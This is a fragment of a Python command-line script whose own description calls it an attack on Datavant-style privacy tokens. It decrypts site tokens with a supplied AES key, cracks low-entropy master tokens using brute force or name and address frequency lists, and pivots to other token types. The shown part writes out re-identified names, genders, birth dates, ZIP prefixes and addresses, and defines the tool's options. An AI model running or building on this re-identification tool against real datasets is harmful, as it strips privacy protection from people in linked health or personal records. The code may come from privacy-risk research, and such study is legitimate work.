            f.write(f"[TIMER] T2: {t2_time:.2f} seconds\n")
            for mt, (sdx_ln_b, sdx_fn_b, g_b, dob_b) in t2_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   sdx_ln={sdx_ln_b.decode()} sdx_fn={sdx_fn_b.decode()} g={g_b.decode()} dob={dob_b.decode()}\n")

        if t7_hits:
            f.write(f"[T7] {len(t7_hits)} master tokens cracked (pivot)\n")
            f.write(f"[TIMER] T7: {t7_time:.2f} seconds\n")
            for mt, (ln_b, fi3_b, g_b, dob_b) in t7_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode()} fi3={fi3_b.decode()} g={g_b.decode()} dob={dob_b.decode()}\n")

        if t4_pivot_hits:
            f.write(f"[T4] {len(t4_pivot_hits)} master tokens cracked (pivot)\n")
            f.write(f"[TIMER] T4: {t4_time:.2f} seconds\n")
            for mt, (ln_b, fn_b, g_b, dob_b) in t4_pivot_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode()} fn={fn_b.decode()} g={g_b.decode()} dob={dob_b.decode()}\n")

        if t3_pivot_hits:
            f.write(f"[T3] {len(t3_pivot_hits)} master tokens cracked (pivot)\n")
            f.write(f"[TIMER] T3: {t3_time:.2f} seconds\n")
            for mt, (ln_b, fn_b, dob_b, zip3_b) in t3_pivot_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   ln={ln_b.decode()} fn={fn_b.decode()} dob={dob_b.decode()} zip3={zip3_b.decode()}\n")
                
        if t9_pivot_hits:
            f.write(f"[T9] {len(t9_pivot_hits)} master tokens cracked (pivot)\n")
            f.write(f"[TIMER] T9: {t9_time:.2f} seconds\n")
            for mt, (fn_b, addr_b) in t9_pivot_hits.items():
                f.write(f"MT(hex)={mt.hex()}   ←   fn={fn_b.decode()} address={addr_b.decode()}\n")

def main():
    ap = argparse.ArgumentParser(description="Attack Datavant-like tokens: decrypt site tokens, crack low-entropy keys, pivot to higher-entropy.")
    ap.add_argument("--in", dest="infile", required=True, help="CSV with token columns (e.g., T1,T2,T4)")
    ap.add_argument("--out", dest="outfile", required=True, help="Output file for results")
    ap.add_argument("--columns", required=True, help="Comma-separated token column names to use (e.g., T1,T2,T4)")
    ap.add_argument("--dist-file", default="", dest="dist_file", help="(Optional) Distribution CSV providing first_name,last_name,address columns (replaces hardcoded ohio_cleaned.csv)")
    ap.add_argument("--top-n", dest="top_n", type=int, default=500, help="How many top frequent values to take for names/addresses (default: 500)")
    ap.add_argument("--site-key", required=True, help="AES-256 key (hex or utf-8) for site token decryption")
    ap.add_argument("--lang", choices=["de", "us"], default="de", help="Language for hardcoded dictionaries if --dist-file is not used (default: de)")
    ap.add_argument("--master-salt", default="", help="(Optional) master salt (hex or utf-8); if empty uses SHA-256(no salt)")
    ap.add_argument("--bruteforce", action="store_true", help="(Optional) Use PURE brute-force methods (slower but more thorough)")
    args = ap.parse_args()
    run_attack(args)

if __name__ == "__main__":
    main()